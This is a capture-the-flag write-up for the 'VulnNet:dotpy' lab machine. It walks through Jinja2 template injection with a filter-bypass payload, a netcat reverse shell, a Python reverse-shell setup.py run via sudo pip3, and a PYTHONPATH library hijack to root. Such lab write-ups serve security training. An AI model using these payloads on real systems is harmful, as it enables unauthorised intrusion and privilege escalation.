## VulnNet:dotpy

# Enumeration
```
# Nmap 7.91 scan initiated Wed May  5 13:06:37 2021 as: nmap -sCV -oN nmap/initial -vvv -p 8080 10.10.57.32
Nmap scan report for 10.10.57.32
Host is up, received timestamp-reply ttl 61 (0.15s latency).
Scanned at 2021-05-05 13:06:38 PDT for 11s

PORT     STATE SERVICE REASON         VERSION
8080/tcp open  http    syn-ack ttl 61 Werkzeug httpd 1.0.1 (Python 3.6.9)
| http-methods:
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/1.0.1 Python/3.6.9
| http-title: VulnNet Entertainment -  Login  | Discover
|_Requested resource was http://10.10.57.32:8080/login

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed May  5 13:06:49 2021 -- 1 IP address (1 host up) scanned in 11.93 seconds
```

Just a webserver on port 8080. The default page is /login and we are able to register a new account freely at /register and discover the dashboard at /index. The dashboard itself is quite simulated with us being logged in as Staradmin, despite whatever we register, with previous notifications, messages, and access so the login page and dashboard itself may not be what we are looking for, however we will make note of some details for future reference.
```
Possible users/names
Ray Douglas
Ora Hill
Brain Dean
Olive Bridges
Marian Garner
David Grey
Travis Jenkins
Staradmin

email
hello@vulnnet.com
```

Upon attempting to use gobuster to enumerate directories we are presented the following error 
```
Error: the server returns a status code that matches the provided options for non existing urls. http://10.10.57.32:8080/20f0fd80-90d1-422b-a4d5-00252820bc0b => 403 (Length: 3000). To continue please exclude the status code, the length or use the --wildcard switch
```
Interesting, so before we blacklist 403 and attempt to enumerate lets check out what happens if we try and go somewhere like robots.txt
```
403
INVALID CHARACTERS DETECTED
Your request has been blocked.
If you think this is an issue contact us at support@vulnnet.com
ID: 1c36bc623da792fa41c832ne

```

Looks like it doesn't like one of the characters, likely the period so lets try just robots
```

404
SORRY!
The page you’re looking for was not found.
No results for robots
```

Here is the 404 page we were expecting, but it looks like our page request robots is present in the body so let's test for SSTI, using the methodologies found on https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection
```
/${7*7}
404
SORRY!
The page you’re looking for was not found.
No results for ${7*7}

/{{7*7}}

404
SORRY!
The page you’re looking for was not found.
No results for 49
```
Bingo! Looks like something is definitely amiss here so lets try a twig injection
```
/{{dump(app)}}

jinja2.exceptions.UndefinedError

jinja2.exceptions.UndefinedError: 'dump' is undefined
Traceback (most recent call last)

    File "/home/web/shuriken-dotpy/app/home/routes.py", line 28, in route_template

    return render_template( template )

    File "/home/web/.local/lib/python3.6/site-packages/flask/templating.py", line 138, in render_template

    ctx.app.jinja_env.get_or_select_template(template_name_or_list),

    File "/home/web/.local/lib/python3.6/site-packages/jinja2/environment.py", line 930, in get_or_select_template

    return self.get_template(template_name_or_list, parent, globals)

    File "/home/web/.local/lib/python3.6/site-packages/jinja2/environment.py", line 883, in get_template

    return self._load_template(name, self.make_globals(globals))

    File "/home/web/.local/lib/python3.6/site-packages/jinja2/environment.py", line 857, in _load_template

    template = self.loader.load(self, name, globals)

    File "/home/web/.local/lib/python3.6/site-packages/jinja2/loaders.py", line 115, in load

    source, filename, uptodate = self.get_source(environment, name)

    File "/home/web/.local/lib/python3.6/site-packages/flask/templating.py", line 60, in get_source

    return self._get_source_fast(environment, template)

    File "/home/web/.local/lib/python3.6/site-packages/flask/templating.py", line 89, in _get_source_fast

    raise TemplateNotFound(template)
    ...
```

Looks like we are actually on a jinja2 framework and we get some debugging staments giving us some insight into the file system and files being used.
Lets switch our payload over to jinja2 payload that can bypass at least one of the filters we seem to have on '.', and see if we get the id of the user
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2---filter-bypass
If you haven't already been using burpsuite to send these requests, switch over now as firefox will not give us the results we are looking for.

```
{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fgetitem\x5f\x5f')('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}
```
This works! Awesome so let's just take a normal reverse shell such as rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc ip port >/tmp/f, and then hex-encoded it with /x delimiters and try and replace the 'id' command with it. Sure enough we get a hit on our listener and we have a foothold

# Initial Foothold
Afer stabilizing our shell we are the web user and find out the following
```
web@vulnnet-dotpy:~$ sudo -l
Matching Defaults entries for web on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User web may run the following commands on vulnnet-dotpy:
    (system-adm) NOPASSWD: /usr/bin/pip3 install *
```

From GTFOBins
```
TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
pip install $TF
```

So we can make a directory in tmp such as, /tmp/exploit and then place a setup.py file with our payload, so we make the following setup.py file in the /tmp/exploit directory
```
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ip",port))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
import pty
pty.spawn("/bin/bash")
```

Then execute the following, to have our exploit run and our listener get a shell as the system-adm user
```
sudo -u system-adm /usr/bin/pip3 install /tmp/exploit
```

# Privilege Escalation
We can find the user.txt flag in the system-adm home directory and then find the following,
```
system-adm@vulnnet-dotpy:/tmp/pip-i1dkkxoz-build$ sudo -l
Matching Defaults entries for system-adm on vulnnet-dotpy:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User system-adm may run the following commands on vulnnet-dotpy:
    (ALL) SETENV: NOPASSWD: /usr/bin/python3 /opt/backup.py
```

The presence of SETENV in the sudo entry for running backup.p gives me an idea that we are likely going to be working with some python libray hijacking so lets see what this file is doing and if we can make any modifications

```
system-adm@vulnnet-dotpy:/opt$ ls -la
total 12
drwxr-xr-x  2 root root 4096 Dec 21 18:21 .
drwxr-xr-x 23 root root 4096 Dec 20 18:30 ..
-rwxrwxr--  1 root root 2125 Dec 21 18:21 backup.py

system-adm@vulnnet-dotpy:/opt$ cat backup.py
from datetime import datetime
from pathlib import Path
import zipfile


OBJECT_TO_BACKUP = '/home/manage'  # The file or directory to backup
BACKUP_DIRECTORY = '/var/backups'  # The location to store the backups in
MAX_BACKUP_AMOUNT = 300  # The maximum amount of backups to have in BACKUP_DIRECTORY


object_to_backup_path = Path(OBJECT_TO_BACKUP)
backup_directory_path = Path(BACKUP_DIRECTORY)
assert object_to_backup_path.exists()  # Validate the object we are about to backup exists before we continue

# Validate the backup directory exists and create if required
backup_directory_path.mkdir(parents=True, exist_ok=True)

# Get the amount of past backup zips in the backup directory already
existing_backups = [
    x for x in backup_directory_path.iterdir()
    if x.is_file() and x.suffix == '.zip' and x.name.startswith('backup-')
]

# Enforce max backups and delete oldest if there will be too many after the new backup
oldest_to_newest_backup_by_name = list(sorted(existing_backups, key=lambda f: f.name))
while len(oldest_to_newest_backup_by_name) >= MAX_BACKUP_AMOUNT:  # >= because we will have another soon
    backup_to_delete = oldest_to_newest_backup_by_name.pop(0)
    backup_to_delete.unlink()

# Create zip file (for both file and folder options)
backup_file_name = f'backup-{datetime.now().strftime("%Y%m%d%H%M%S")}-{object_to_backup_path.name}.zip'
zip_file = zipfile.ZipFile(str(backup_directory_path / backup_file_name), mode='w')
if object_to_backup_path.is_file():
    # If the object to write is a file, write the file
    zip_file.write(
        object_to_backup_path.absolute(),
        arcname=object_to_backup_path.name,
        compress_type=zipfile.ZIP_DEFLATED
    )
elif object_to_backup_path.is_dir():
    # If the object to write is a directory, write all the files
    for file in object_to_backup_path.glob('**/*'):
        if file.is_file():
            zip_file.write(
                file.absolute(),
                arcname=str(file.relative_to(object_to_backup_path)),
                compress_type=zipfile.ZIP_DEFLATED
            )
# Close the created zip file
zip_file.close()
```

We can't edit the file itself, however because of the SETENV we can specify the PYTHONPATH for imports, which we have one of, zipfile.

So in /tmp lets make a zipfile.py with the following simple payload,
```
import pty
pty.spawn("/bin/bash")
```

With our libary hijack in place, we execute the following command, 
```
sudo PYTHONPATH=/tmp/ /usr/bin/python3 /opt/backup.py
```
We successfully spawn a root shell and we can claim the root.txt flag in /root.

